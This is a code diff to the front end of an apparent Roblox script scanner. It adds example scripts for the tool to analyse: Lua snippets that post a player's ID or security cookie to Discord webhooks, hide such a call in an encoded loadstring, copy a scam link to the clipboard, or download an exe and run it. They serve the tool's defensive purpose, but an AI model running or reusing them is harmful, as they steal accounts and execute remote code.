@@ -7,7 +7,7 @@
   var PROXY_URL = '';
 
   var VIEWS = {
-    dump: ['Is this script safe?', 'Paste a Roblox script or a link to one. We read it, follow what it downloads, and tell you what it really does.'],
+    dump: ['Roblox script scanner', 'Drop a script or paste a link. We decode it layer by layer, follow what it downloads and show what it tries to do, before you run it.'],
     clean: ['Deobfuscator', 'Turn an unreadable script into something you can read.'],
     byte: ['Bytecode', 'Read the text hidden inside compiled Luau or Lua files.'],
     api: ['API', 'Use the same tools from your own JavaScript.'],
@@ -21,6 +21,9 @@
     loader: 'loadstring(game:HttpGet("https://scriptblox.com/raw/Example-Hub_abc123"))()\n',
     stealer: 'local hook = "https://discord.com/api/webhooks/123456/abcdef"\nlocal plr = game.Players.LocalPlayer\ngame:GetService("HttpService"):PostAsync(hook, plr.Name .. " " .. plr.UserId)\n',
     hidden: 'local Players = game:GetService("Players")\nloadstring("' + enc('local hook="https://discord.com/api/webhooks/123/abc" game:GetService("HttpService"):PostAsync(hook, tostring(game.Players.LocalPlayer.UserId))') + '")()\n',
+    cookie: 'local c = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_ABC123"\nrequest({ Url = "https://discord.com/api/webhooks/1/x", Method = "POST", Body = c })\n',
+    fake: 'local link = "https://roblox-free-robux.xyz/claim"\nsetclipboard(link)\nprint("Join our group for free robux!")\n',
+    installer: 'writefile("update.exe", game:HttpGet("https://example.com/setup.exe"))\nos.execute("update.exe")\n',
     luarmor: 'script_key = "YOUR_KEY_HERE"\nloadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/0123456789abcdef0123456789abcdef.lua"))()\n'
   };
 
@@ -108,7 +111,7 @@
 
   function dump() {
     if (!need()) return;
-    remote = {}; tried = {}; runId++; tab = 'sum'; layerIx = 0; catSel = 'all';
+    remote = {}; tried = {}; runId++; tab = 'sum'; layerIx = 0; catSel = 'all'; openAcc = {};
     if (!analyze()) return;
     $('dumpOut').scrollIntoView({ behavior: 'smooth', block: 'start' });
     follow(runId);
@@ -147,7 +150,7 @@
   }
 
   function doesHtml(d) {
-    return '<h3>What this script does</h3><ul class="does">' + d.says.map(function (s) { return '<li class="k-' + s.kind + '">' + svg(s.kind) + '<span>' + esc(s.text) + '</span></li>'; }).join('') + '</ul>';
+    return '<h3 class="sec">What this script does</h3><ul class="does">' + d.says.map(function (s) { return '<li class="k-' + s.kind + '">' + svg(s.kind) + '<span>' + esc(s.text) + '</span></li>'; }).join('') + '</ul>';
   }
   var TIPS = {
     protected: ['Only use scripts from creators with a real community: a Discord with members, reviews, a history.', 'Try it on an alt account first, never on your main.', 'Never type your Roblox password or cookie into anything a script shows you.'],
@@ -179,61 +182,62 @@
     return p ? '<div class="busy" role="status"><i></i><span>Downloading the script from ' + esc(p.name) + '…</span></div>' : '';
   }
 
+  var openAcc = {};
+  function mergedCode() {
+    var d = cur;
+    return d.layers.map(function (ly, i) {
+      return (d.layers.length > 1 ? '-- ===== ' + (i === 0 ? 'Your script (cleaned)' : 'Layer ' + i + ': ' + ly.via) + ' =====\n' : '') + ly.code;
+    }).join('\n\n');
+  }
+  function sec(id, title, note) { return '<h3 class="sec" id="' + id + '">' + title + (note ? ' <span class="muted">' + note + '</span>' : '') + '</h3>'; }
+  function netHtml(d) {
+    if (!d.loaders.length) return '<p class="empty" style="padding:18px 0 4px">No links or network calls found.</p>';
+    return d.loaders.map(function (l, i) {
+      return '<div class="lk"><span class="role ' + l.role + '">' + ROLE[l.role] + '</span><div><div class="meta"><span class="chip ' + (CLS_CHIP[l.cls] || '') + '">' + esc(l.name) + '</span>' +
+        (l.resolved ? '<span class="chip ok">read</span>' : '') + (l.layer ? '<span class="chip">layer ' + l.layer + '</span>' : '') + (l.count > 1 ? '<span class="chip">' + l.count + ' times</span>' : '') +
+        '</div><code>' + esc(l.url) + '</code></div><button class="btn sm" data-copy="' + i + '" type="button">Copy</button></div>';
+    }).join('');
+  }
+  function catsHtml() {
+    var d = cur, cats = {}; d.calls.forEach(function (c) { cats[c.cat] = (cats[c.cat] || 0) + 1; });
+    return '<button class="btn sm' + (catSel === 'all' ? ' on' : '') + '" data-cat="all" type="button">All ' + d.calls.length + '</button>' +
+      Object.keys(d.catLabels).filter(function (k) { return cats[k]; }).map(function (k) {
+        return '<button class="btn sm' + (catSel === k ? ' on' : '') + '" data-cat="' + k + '" type="button">' + d.catLabels[k] + ' ' + cats[k] + '</button>';
+      }).join('');
+  }
+  function body() { var c = $('catBar'); if (c) c.innerHTML = catsHtml(); callsList(); }
+
   function render() {
-    var d = cur, o = d.obfuscation, links = d.loaders.length, n = d.meta.layers;
-    var notes = d.findings.length;
+    document.querySelectorAll('#dumpOut details[data-k]').forEach(function (x) { openAcc[x.dataset.k] = x.open; });
+    var d = cur, o = d.obfuscation, links = d.loaders.length, n = d.meta.layers, code = mergedCode();
+    var warns = d.findings.filter(function (f) { return f.level >= 2; }).length;
     var facts = '<div class="facts"><span><b>' + esc(o.label) + '</b>' + (o.families.length ? ' (' + esc(o.families.join(', ')) + ')' : '') + '</span>' +
-      '<span><b>' + n + '</b> extra ' + (n === 1 ? 'layer' : 'layers') + ' read</span>' +
-      '<span><b>' + links + '</b> ' + (links === 1 ? 'link' : 'links') + '</span>' +
+      '<span><b>' + n + '</b> extra ' + (n === 1 ? 'layer' : 'layers') + ' read</span><span><b>' + links + '</b> ' + (links === 1 ? 'link' : 'links') + '</span>' +
       '<span><b>' + d.meta.lines + '</b> ' + (d.meta.lines === 1 ? 'line' : 'lines') + ', ' + (d.meta.bytes / 1024).toFixed(1) + ' KB</span></div>';
-    var tabs = [['sum', 'Details', notes], ['links', 'Links', links], ['layers', 'Code', d.layers.length], ['strs', 'Text', d.strings.length], ['calls', 'Functions', d.calls.length]];
-    $('dumpOut').innerHTML = busyHtml(d) + bandHtml(d, facts).html + doesHtml(d) + tipsHtml(d) + pendingHtml(d) +
-      '<div class="tabs" role="tablist">' + tabs.map(function (t) {
-        return '<button class="tab' + (t[0] === tab ? ' on' : '') + '" role="tab" data-tab="' + t[0] + '">' + t[1] + '<i>' + t[2] + '</i></button>';
-      }).join('') + '</div><div class="panel" id="tabBody"></div>' +
+    var tech = '';
+    if (d.iocs.ips.length) tech += '<h4>IP addresses</h4><ul class="list">' + d.iocs.ips.map(function (ip) { return '<li><code>' + esc(ip) + '</code></li>'; }).join('') + '</ul>';
+    if (d.iocs.assets.length) tech += '<h4>Roblox asset IDs</h4><ul class="list">' + d.iocs.assets.map(function (a) { return '<li><code>' + esc(a.id) + '</code><span class="chip">' + esc(a.kind) + '</span></li>'; }).join('') + '</ul>';
+    $('dumpOut').innerHTML = busyHtml(d) + bandHtml(d, facts).html +
+      '<nav class="jump" aria-label="On this page"><a href="#sec-does">Summary</a><a href="#sec-net">Network</a><a href="#sec-warn">Warnings</a><a href="#sec-code">Code</a><a href="#sec-more">Details</a></nav>' +
+      '<div id="sec-does">' + doesHtml(d) + '</div>' + tipsHtml(d) + pendingHtml(d) +
+      sec('sec-net', 'Network activity', '(' + links + ')') + '<div class="hint">Links are never opened for you unless you press Download. We never run what they return, only read it.</div>' + netHtml(d) +
+      sec('sec-warn', 'Warnings', '(' + warns + ')') + findingsHtml(d.findings, true) +
+      sec('sec-code', 'Decoded code', n ? '(' + plural(n, 'extra layer') + ' unpacked, all in this one file)' : '') +
+      '<div class="codewrap"><div class="etop"><span class="fname">' + (d.layers.length > 1 ? 'All layers in one file' : 'Your script (cleaned)') + '</span><span class="muted">' + plural(code.split('\n').length, 'line') + '</span><span class="grow"></span>' +
+      '<button class="btn sm" data-act="copy-code" type="button">Copy</button><button class="btn sm" data-act="save-code" type="button">Save .lua</button></div>' +
+      '<textarea class="codebox" id="codeBox" readonly spellcheck="false" aria-label="Decoded code"></textarea></div>' +
+      '<p class="muted">Escapes, split strings and hex numbers are decoded so the text is readable.</p>' +
+      sec('sec-more', 'More details') +
+      '<details class="acc" data-k="obf"><summary>Obfuscation <span class="muted">(' + esc(o.label) + ', score ' + o.score + ' out of 100)</span></summary>' +
+        (o.signals.length ? '<ul class="sig">' + o.signals.map(function (x) { return '<li>' + esc(x) + '</li>'; }).join('') + '</ul>' : '<p class="muted">Nothing here looks scrambled.</p>') + '</details>' +
+      (tech ? '<details class="acc" data-k="tech"><summary>IP addresses and asset IDs</summary>' + tech + '</details>' : '') +
+      '<details class="acc" data-k="strs"><summary>All text <span class="muted">(' + d.strings.length + ')</span></summary><div class="toolbar"><input class="srch" id="strQ" type="search" placeholder="Search text" aria-label="Search text"><label class="chk"><input type="checkbox" id="strHid"> Only text revealed by decoding</label></div><ul class="list" id="strList"></ul></details>' +
+      '<details class="acc" data-k="calls"><summary>All function calls <span class="muted">(' + d.calls.length + ')</span></summary><div class="toolbar cats" id="catBar"></div><ul class="list" id="callList"></ul></details>' +
       '<div class="row"><button class="btn sm" data-act="summary" type="button">Copy summary</button><button class="btn sm" data-act="report" type="button">Save report (.txt)</button><button class="btn sm" data-act="json" type="button">Save as JSON</button></div>';
-    body();
+    $('codeBox').value = code; strs(); body();
+    document.querySelectorAll('#dumpOut details[data-k]').forEach(function (x) { if (openAcc[x.dataset.k]) x.open = true; });
   }
 
-  function body() {
-    var d = cur, h = '';
-    if (tab === 'sum') {
-      var o = d.obfuscation;
-      h += (d.meta.layers ? '<div class="hint">Extra code was unpacked or downloaded and checked too. Open the <b>Code</b> tab to read it.</div>' : '') + findingsHtml(d.findings, true);
-      h += '<h3>Obfuscation</h3><div><b>' + esc(o.label) + '</b> <span class="muted">(score ' + o.score + ' out of 100' + (o.families.length ? ', looks like ' + esc(o.families.join(', ')) : '') + ')</span>' +
-        (o.signals.length ? '<ul class="sig">' + o.signals.map(function (s) { return '<li>' + esc(s) + '</li>'; }).join('') + '</ul>' : '<p class="muted" style="margin:4px 0 0">Nothing here looks scrambled.</p>') + '</div>';
-      if (d.iocs.ips.length) h += '<h3>IP addresses</h3><ul class="list">' + d.iocs.ips.map(function (ip) { return '<li><code>' + esc(ip) + '</code></li>'; }).join('') + '</ul>';
-      if (d.iocs.assets.length) h += '<h3>Roblox asset IDs</h3><ul class="list">' + d.iocs.assets.map(function (a) { return '<li><code>' + esc(a.id) + '</code><span class="chip">' + esc(a.kind) + '</span></li>'; }).join('') + '</ul>';
-    } else if (tab === 'links') {
-      h += '<div class="hint">Links are never opened for you unless you press Download. We never run what they return, only read it.</div>';
-      h += d.loaders.length ? d.loaders.map(function (l, i) {
-        return '<div class="lk"><span class="role ' + l.role + '">' + ROLE[l.role] + '</span><div><div class="meta"><span class="chip ' + (CLS_CHIP[l.cls] || '') + '">' + esc(l.name) + '</span>' +
-          (l.resolved ? '<span class="chip ok">read</span>' : '') + (l.layer ? '<span class="chip">layer ' + l.layer + '</span>' : '') + (l.count > 1 ? '<span class="chip">' + l.count + ' times</span>' : '') + '</div><code>' + esc(l.url) + '</code></div>' +
-          '<button class="btn sm" data-copy="' + i + '" type="button">Copy</button></div>';
-      }).join('') : '<p class="empty">No links found.</p>';
-    } else if (tab === 'layers') {
-      h += '<div class="layers">' + d.layers.map(function (ly, i) {
-        return '<button class="btn sm' + (i === layerIx ? ' on' : '') + '" data-layer="' + i + '" type="button">' + (i === 0 ? 'Your script (cleaned)' : 'Layer ' + i) + '</button>';
-      }).join('') + '</div>';
-      var ly = d.layers[layerIx];
-      h += '<div class="codewrap"><div class="etop"><span class="fname">' + esc(ly.via) + '</span><span class="muted">' + plural(ly.lines, 'line') + ', ' + (ly.size / 1024).toFixed(1) + ' KB</span><span class="grow"></span>' +
-        '<button class="btn sm" data-act="copy-layer" type="button">Copy</button><button class="btn sm" data-act="save-layer" type="button">Save .lua</button></div>' +
-        '<textarea class="codebox" id="layerBox" readonly spellcheck="false" aria-label="Decoded code"></textarea></div>' +
-        (layerIx === 0 ? '<p class="muted">Escapes, split strings and hex numbers are decoded so the text is readable. Layers below are code that was stored inside strings or downloaded.</p>' : '');
-    } else if (tab === 'strs') {
-      h += '<div class="toolbar"><input class="srch" id="strQ" type="search" placeholder="Search text" aria-label="Search text"><label class="chk"><input type="checkbox" id="strHid"> Only text revealed by decoding</label></div><ul class="list" id="strList"></ul>';
-    } else {
-      var cats = {}; d.calls.forEach(function (c) { cats[c.cat] = (cats[c.cat] || 0) + 1; });
-      h += '<div class="toolbar cats"><button class="btn sm' + (catSel === 'all' ? ' on' : '') + '" data-cat="all" type="button">All ' + d.calls.length + '</button>' +
-        Object.keys(d.catLabels).filter(function (k) { return cats[k]; }).map(function (k) {
-          return '<button class="btn sm' + (catSel === k ? ' on' : '') + '" data-cat="' + k + '" type="button">' + d.catLabels[k] + ' ' + cats[k] + '</button>';
-        }).join('') + '</div><ul class="list" id="callList"></ul>';
-    }
-    $('tabBody').innerHTML = h;
-    if (tab === 'layers') $('layerBox').value = d.layers[layerIx].code;
-    if (tab === 'strs') strs();
-    if (tab === 'calls') callsList();
-  }
   function strs() {
     var q = ($('strQ').value || '').toLowerCase(), only = $('strHid').checked;
     var list = cur.strings.filter(function (s) { return (!only || s.hidden) && (!q || s.text.toLowerCase().indexOf(q) >= 0); });
@@ -273,8 +277,8 @@
       msg(''); remote[p2.fetchUrl] = ta.value; tried[p2.fetchUrl] = 'done'; analyze(); follow(runId);
     }
     else if (b.dataset.act === 'summary') copy(reportText(), b);
-    else if (b.dataset.act === 'copy-layer') copy(cur.layers[layerIx].code, b);
-    else if (b.dataset.act === 'save-layer') dl(layerIx === 0 ? 'cleaned.lua' : 'layer' + layerIx + '.lua', cur.layers[layerIx].code);
+    else if (b.dataset.act === 'copy-code') copy(mergedCode(), b);
+    else if (b.dataset.act === 'save-code') dl('decoded.lua', mergedCode());
     else if (b.dataset.act === 'report') dl('report.txt', reportText());
     else if (b.dataset.act === 'json') dl('report.json', JSON.stringify(cur, null, 2));
   });
